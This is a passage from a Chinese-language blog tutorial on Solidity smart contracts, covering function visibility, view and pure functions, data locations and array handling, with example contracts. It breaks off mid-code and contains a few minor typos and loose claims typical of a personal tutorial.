<h4 id="public"><a href="#public" class="headerlink" title="public"></a>public</h4><p>&emsp;&emsp;public的特点是，函数既可以以internal方式调用，也可以用internal方式调用。public函数可以被外部接口访问，是合约对外接口的一部分。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fun1</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    funciton fun2() public &#123;</span><br><span class="line">        fun1();</span><br><span class="line">        <span class="keyword">this</span>.fun2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;可以看到没有报错，既然public这么舒服，那为啥我还要用external？？？  </p>
<p>&emsp;&emsp;经过对比后我们可以发现，external方法消耗的gas要比public少，因为Solidity在调用public函数时会将代码复制到EVM的内存中，而external则是以calldata的方式进行调用的。内存分配在EVM中是十分宝贵的，而读取calldata则十分廉价，因此在处理大量外部数据，并反复调用函数时，应当考虑用external方法。  </p>
<p>&emsp;&emsp;这里应当注意的是，public属于可见性。函数的可见性分为四种：<strong>public private internal external</strong> .  </p>
<h4 id="private"><a href="#private" class="headerlink" title="private"></a>private</h4><p>&emsp;&emsp;对于private，与internal的区别是，private的方法在子类中无法调用，即使被声明为private也不能阻止数据的查看。访问权限仅仅是限制其他合约对函数的访问和数据修改的权限。而private方法也默认以internal的方式调用。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fun1</span>(<span class="params"></span>) <span class="title">private</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fun2</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        fun1();</span><br><span class="line">        <span class="comment">//this.fun1()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//合约的继承为is，这一点很容易理解，如果你明白设计模式的话，实际上继承是A is B 的关系,我很喜欢这种写法。</span></span><br><span class="line"></span><br><span class="line">contract ext is test&#123;   </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callFun</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">//fun1();   </span></span><br><span class="line">        fun2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里我们可以明确的看到private的效果，和internal类似，但是代价会更大。  </p>
<p>&emsp;&emsp;然而 <strong>public</strong> 与 <strong>private</strong> 还可以被作用于其他的变量，用于设置外部访问权限。  </p>
<p>&emsp;&emsp;请大家务必不要弄混 <strong>调用方式</strong> 与 <strong>可见性(visable)</strong> 。  </p>
<blockquote>
<p>关于 view pure constant  </p>
</blockquote>
<p>&emsp;&emsp;在0.4.1之前只有constant这一种可爱的语法，就是有一些屁事很多的人觉得constant指的是变量，作用于函数不太合适，所以就把constant拆成了view和pure。  </p>
<p>&emsp;&emsp;在Solidity中，<strong>constant view pure</strong> 的作用是告诉编译器，函数 <strong>不改变</strong>，<strong>不读取</strong>状态变量，这样一来函数的执行就不再消耗gas了，因为不再需要矿工去验证。  </p>
<p>&emsp;&emsp;然而这三个东西有点有意思，在官方文档中用 <strong>restrictive</strong> 这一词来对函数的严格性进行描述，在函数类型转换时对严格行有一定的要求，高严格性函数可以被转化为低严格性函数：  </p>
<ul>
<li><p>pure 类型可被转化为 <strong>view</strong> 和 <strong>non-payable</strong> 函数  </p>
</li>
<li><p>view 类型可被转化为 non-payable 函数  </p>
</li>
<li><p>payable 类型可被转化为 non-payable 函数  </p>
</li>
</ul>
<p>Member:  </p>
<ol>
<li>selector  返回ABI函数选择器。  </li>
<li>gas(uint) 返回一个函数对象，当被调用时将会发送具体数目的Gas给目标函数。  </li>
<li>value(uint)返回一个函数对象了，当被调用时将会发送具体的wei给目标函数，或者使用value(1 ether)的方式来发送以太币。  </li>
</ol>
<p>&emsp;&emsp;我们来看一下用法示例：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.16</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Example &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> <span class="title">returns</span> (<span class="params">bytes4</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.f.selector;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.f.gas(<span class="number">10</span>).value(<span class="number">800</span>)();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;下面是internal关键字的用法示例：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.16</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">library ArrayUtils &#123;</span><br><span class="line">  <span class="comment">// internal functions can be used in internal library functions because</span></span><br><span class="line">  <span class="comment">// they will be part of the same code context</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params">uint[] memory self, function (uint</span>) <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint</span>) <span class="title">f</span>)</span></span><br><span class="line"><span class="function">    <span class="title">internal</span></span></span><br><span class="line"><span class="function">    <span class="title">pure</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span> (<span class="params">uint[] memory r</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    r = <span class="keyword">new</span> uint[](self.length);</span><br><span class="line">    <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; self.length; i++) &#123;</span><br><span class="line">      r[i] = f(self[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">reduce</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    uint[] memory self,</span></span></span><br><span class="line"><span class="function"><span class="params">    function (uint, uint</span>) <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint</span>) <span class="title">f</span></span></span><br><span class="line"><span class="function">  )</span></span><br><span class="line"><span class="function">    <span class="title">internal</span></span></span><br><span class="line"><span class="function">    <span class="title">pure</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span> (<span class="params">uint r</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    r = self[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (uint i = <span class="number">1</span>; i &lt; self.length; i++) &#123;</span><br><span class="line">      r = f(r, self[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">range</span>(<span class="params">uint length</span>) <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint[] memory r</span>) </span>&#123;</span><br><span class="line">    r = <span class="keyword">new</span> uint[](length);</span><br><span class="line">    <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; r.length; i++) &#123;</span><br><span class="line">      r[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Pyramid &#123;</span><br><span class="line">  using ArrayUtils <span class="keyword">for</span> *;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">pyramid</span>(<span class="params">uint l</span>) <span class="title">public</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ArrayUtils.range(l).map(square).reduce(sum);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">square</span>(<span class="params">uint x</span>) <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">uint x, uint y</span>) <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;接下来是external关键字的用法：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.22</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Oracle &#123;</span><br><span class="line">  struct Request &#123;</span><br><span class="line">    bytes data;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">uint</span>) <span class="title">external</span> <span class="title">callback</span>;</span></span><br><span class="line"><span class="function">  &#125;</span></span><br><span class="line">  Request[] requests;</span><br><span class="line">  event NewRequest(uint);</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">query</span>(<span class="params">bytes memory data, function(uint</span>) <span class="title">external</span> <span class="title">callback</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    requests.push(Request(data, callback));</span><br><span class="line">    emit NewRequest(requests.length - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">reply</span>(<span class="params">uint requestID, uint response</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Here goes the check that the reply comes from a trusted source</span></span><br><span class="line">    requests[requestID].callback(response);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract OracleUser &#123;</span><br><span class="line">  Oracle constant oracle = Oracle(<span class="number">0x1234567</span>); <span class="comment">// known contract</span></span><br><span class="line">  uint exchangeRate;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">buySomething</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    oracle.query(<span class="string">"USD"</span>, <span class="keyword">this</span>.oracleResponse);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">oracleResponse</span>(<span class="params">uint response</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(</span><br><span class="line">        msg.sender == address(oracle),</span><br><span class="line">        <span class="string">"Only oracle can call this."</span></span><br><span class="line">    );</span><br><span class="line">    exchangeRate = response;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Lambda(匿名)和inline(内联)函数暂时不支持，在后续版本即将推出。  </p>
</blockquote>
<ul>
<li>引用类型(Reference Type)  </li>
</ul>
<p>&emsp;&emsp;引用与C++中的引用类似，即一个量可以通过多个别名修改，与值类型相比较，后者可以直接得到一个拷贝对象。因此，在使用引用类型时应当格外小心。目前，引用类型包括结构，数组和映射。如果你使用一个引用类型，你必须显式的声明他的储存位置：  </p>
<blockquote>
<p>memory 生命周期为一个函数调用，只在EVM内存中存在<br>storage 生命周期无限，与状态变量一起储存在区块链上<br>calldata 包含函数参数的特殊数据位置，仅可用于external函数调用参数  </p>
</blockquote>
<p>&emsp;&emsp;更改Data Location的赋值或类型转换将会引发自动复制操作，若两者的Data Location类型相同，那么只在两者均为storage的某些情况下才会引发复制临时对象。  </p>
<h4 id="数据位置-Data-Location"><a href="#数据位置-Data-Location" class="headerlink" title="数据位置(Data Location)"></a>数据位置(Data Location)</h4><p>&emsp;&emsp;如上面提到，引用类型必须显式的添加”data location”的声明，即memory storage calldata.<br>&emsp;&emsp;Calldata只对external函数的参数有效，并且对于此类型的参数是必须的。Calldata类型的变量的存储位置是不可修改的，非持久的储存函数参数的区域，行为与memory十分类似。  </p>
<h4 id="内存区域和分配行为"><a href="#内存区域和分配行为" class="headerlink" title="内存区域和分配行为"></a>内存区域和分配行为</h4><p>&emsp;&emsp;数据位置不仅与数据的持久性有关，还与赋值的语义有关：  </p>
<ol>
<li>当赋值行为在memory(或者calldata)与storage之间时，会直接创造一个拷贝对象  </li>
<li>当赋值行为是memory与memory时，仅仅创造一个引用，这意味着如果修改其中一个memory变量，将会导致所指向的同一位置的内存数据的修改(与C语言的指针类似)  </li>
<li>当storage赋值给local storage(函数中的storage)之间时，此时也仅仅分配一个引用  </li>
<li>其他所有赋值给storage或状态变量的操作都会创造一个拷贝对象，即使给storage的局部变量仅仅是个引用。下面的例子展现了这几种特性：  </li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.0</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    uint[] x; <span class="comment">// the data location of x is storage</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// the data location of memoryArray is memory</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">uint[] memory memoryArray</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        x = memoryArray; <span class="comment">// works, copies the whole array to storage</span></span><br><span class="line">        uint[] storage y = x; <span class="comment">// works, assigns a pointer, data location of y is storage</span></span><br><span class="line">        y[<span class="number">7</span>]; <span class="comment">// fine, returns the 8th element</span></span><br><span class="line">        y.length = <span class="number">2</span>; <span class="comment">// fine, modifies x through y</span></span><br><span class="line">        <span class="keyword">delete</span> x; <span class="comment">// fine, clears the array, also modifies y</span></span><br><span class="line">        <span class="comment">// The following does not work; it would need to create a new temporary /</span></span><br><span class="line">        <span class="comment">// unnamed array in storage, but storage is "statically" allocated:</span></span><br><span class="line">        <span class="comment">// y = memoryArray;</span></span><br><span class="line">        <span class="comment">// This does not work either, since it would "reset" the pointer, but there</span></span><br><span class="line">        <span class="comment">// is no sensible location it could point to.</span></span><br><span class="line">        <span class="comment">// delete y;</span></span><br><span class="line">        g(x); <span class="comment">// calls g, handing over a reference to x</span></span><br><span class="line">        h(x); <span class="comment">// calls h and creates an independent, temporary copy in memory</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params">uint[] storage</span>) <span class="title">internal</span> <span class="title">pure</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params">uint[] memory</span>) <span class="title">public</span> <span class="title">pure</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li>数组(Array)  </li>
</ul>
<p>&emsp;&emsp;数组的用法上面介绍的都差不多了，这里需要注意的是solidity中的数组的声明方式与通常的语言不同，他的第一个下标是一个数组的位置，第二个下标是数组中元素的位置：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uint[][<span class="number">5</span>] x memory;		<span class="comment">//一个由5个储存uint类型的动态数组被写入数组x		这种方式与其他语言相反</span></span><br><span class="line"></span><br><span class="line">X[<span class="number">2</span>][<span class="number">1</span>];		<span class="comment">//代表第三个数组的第二个元素</span></span><br><span class="line"></span><br><span class="line">T[<span class="number">5</span>] a;			<span class="comment">//T本身可以是个数组，那么a[2]就代表T类型的变量</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;数组元素可以是任意类型，包括映射(mapping)与结构(struct)类型。但是通常情况下这种使用有限制，因为mapping与struct必须存储在storage数据区域内。  </p>
<p>&emsp;&emsp;将状态变量数组声明为public是可行的，并且solidity将会为其创建一个getter接口。那么数组的数字索引将会是getter()的参数。  </p>
<p>&emsp;&emsp;当数组寻址且超过其长度范围时，将会导致一个失败断言(failing assertion).你可以使用.push()与.pop()函数来向末尾增加或弹出元素(与C++的STL类似)，也可以直接修改.length成员来修改数组的长度。  </p>
<blockquote>
<p>关于bytes与string  </p>
</blockquote>
<p>&emsp;&emsp;bytes与string是特殊测数组，bytes与byte[]类似，但是他在calldata与memory存储区域内将会被打包的更紧致。string与bytes的区别是，string不能访问.length也不能进行寻址操作。  </p>
<p>&emsp;&emsp;solidity没有字符串操作函数，但有第三方字符串库。还可以使用keccak256-hash函数来比较两个字符串：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keccak256(abi.encodePacked(s1)) == keccak256(abi.encodePacked(s2))</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;并通过<code>abi.encodePacked(s1, s2)</code>来连接两个字符串。  </p>
<p>&emsp;&emsp;你应当尽量的使用bytes而不是bytes[]，因为bytes[]在两个元素之间增加了31个填充字节。作为一般规则，对任意长度的原始byte数据使用bytes，对任意长度字符串（UTF-8）数据使用string。  </p>
<blockquote>
<p>加入你一定要对string对象进行.length或者寻址操作，那么你应当先把他强制转换为bytes类型，如：  </p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string s;</span><br><span class="line"></span><br><span class="line">uint len = bytes(s).length;</span><br><span class="line"></span><br><span class="line">bytes(s)[<span class="number">7</span>] = <span class="string">'x'</span>;</span><br></pre></td></tr></table></figure>
<h4 id="为数组分配内存"><a href="#为数组分配内存" class="headerlink" title="为数组分配内存"></a>为数组分配内存</h4><p>&emsp;&emsp;为数组分配内存与C++类似，要使用new关键字在内存中创建运行时确定长度的数组,如：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.16</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">uint len</span>) <span class="title">public</span> <span class="title">pure</span> </span>&#123;</span><br><span class="line">        uint[] memory a = <span class="keyword">new</span> uint[](<span class="number">7</span>);</span><br><span class="line">        bytes memory b = <span class="keyword">new</span> bytes(len);</span><br><span class="line">        assert(a.length == <span class="number">7</span>);</span><br><span class="line">        assert(b.length == len);</span><br><span class="line">        a[<span class="number">6</span>] = <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="数组成员"><a href="#数组成员" class="headerlink" title="数组成员"></a>数组成员</h4><p><strong>Length</strong>:<br>    数组的length成员包含了数组元素的个数，这个长度在内存中一旦确定是不可变的(不包括动态数组)，对于动态数组，给length重新赋值能够修改其长度。当寻址超出长度之外时，你将会引发一个失败断言。新增加的长度的值被初始化为0,你可以通过delete关键字删除单个的元素来减少数组的长度。如果你尝试改变一个非动态数组的length，你会得到一个<code>Value must be an lvalue</code>错误。  </p>
<p><strong>push</strong>:<br>&emsp;&emsp;动态数组以及bytes与string拥有push()成员函数，你可以使用push来向数组末尾添加一个元素，若参数为空则默认为0,该函数返回新的数组长度。  </p>
<p><strong>pop</strong>:<br>&emsp;&emsp;动态数组以及bytes与string拥有pop()成员函数，你可以使用pop来删除数组末尾的最后一个元素。  </p>
<blockquote>
<p>注意：  </p>
<blockquote>
<p>这里一定要注意动态数组的下溢问题(underflow)，假如你对一个空数组进行<code>&lt;d-array&gt;.length--</code>操作，那么这将会导致数组的长度变为2**256 - 1,这意味着你将可以访问内存中的任意变量，也可能导致某些逻辑判断的步骤出错。  </p>
</blockquote>
</blockquote>
<p>&emsp;&emsp;增加数组的长度将会消耗固定的Gas，因为新增的元素被初始化为0,当减少长度时则消耗线性的Gas(但通常情况下要比线性糟糕)，    因为包含了显式的删除与清理元素的步骤，即调用delete关键字。  </p>
<blockquote>
<p>目前还不能在external函数中使用数组的数组，但是在public函数中是支持的。  </p>
</blockquote>
<blockquote>
<p>在拜占庭(Byzantium)之前的EVM版本中，无法访问函数调用返回的动态数组。如果调用返回动态数组的函数，请确保使用设置为拜占庭模式的EVM。关于拜占庭请参考白皮书中的拜占庭将军问题，很有意思。</p>
</blockquote>
<p>&emsp;&emsp;数组用法实例如下：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.16</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract ArrayContract &#123;</span><br><span class="line">    uint[<span class="number">2</span>**<span class="number">20</span>] m_aLotOfIntegers;</span><br><span class="line">    <span class="comment">// Note that the following is not a pair of dynamic arrays but a</span></span><br><span class="line">    <span class="comment">// dynamic array of pairs (i.e. of fixed size arrays of length two).</span></span><br><span class="line">    <span class="comment">// Because of that, T[] is always a dynamic array of T, even if T</span></span><br><span class="line">    <span class="comment">// itself is an array.</span></span><br><span class="line">    <span class="comment">// Data location for all state variables is storage.</span></span><br><span class="line">    bool[<span class="number">2</span>][] m_pairsOfFlags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// newPairs is stored in memory - the only possibility</span></span><br><span class="line">    <span class="comment">// for public contract function arguments</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setAllFlagPairs</span>(<span class="params">bool[<span class="number">2</span>][] memory newPairs</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// assignment to a storage array performs a copy of ``newPairs`` and</span></span><br><span class="line">        <span class="comment">// replaces the complete array ``m_pairsOfFlags``.</span></span><br><span class="line">        m_pairsOfFlags = newPairs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    struct StructType &#123;</span><br><span class="line">        uint[] contents;</span><br><span class="line">        uint moreInfo;</span><br><span class="line">    &#125;</span><br><span class="line">    StructType s;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">uint[] memory c</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// stores a reference to ``s`` in ``g``</span></span><br><span class="line">        StructType storage g = s;</span><br><span class="line">        <span class="comment">// also changes ``s.moreInfo``.</span></span><br><span class="line">        g.moreInfo = <span class="number">2</span>;</span><br><span class="line">        <span class="comment">// assigns a copy because ``g.contents``</span></span><br><span class="line">        <span class="comment">// is not a local variable, but a member of</span></span><br><span class="line">        <span class="comment">// a local variable.</span></span><br><span class="line">        g.contents = c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setFlagPair</span>(<span class="params">uint index, bool flagA, bool flagB</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// access to a non-existing index will throw an exception</span></span><br><span class="line">        m_pairsOfFlags[index][<span class="number">0</span>] = flagA;</span><br><span class="line">        m_pairsOfFlags[index][<span class="number">1</span>] = flagB;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">changeFlagArraySize</span>(<span class="params">uint newSize</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// if the new size is smaller, removed array elements will be cleared</span></span><br><span class="line">        m_pairsOfFlags.length = newSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// these clear the arrays 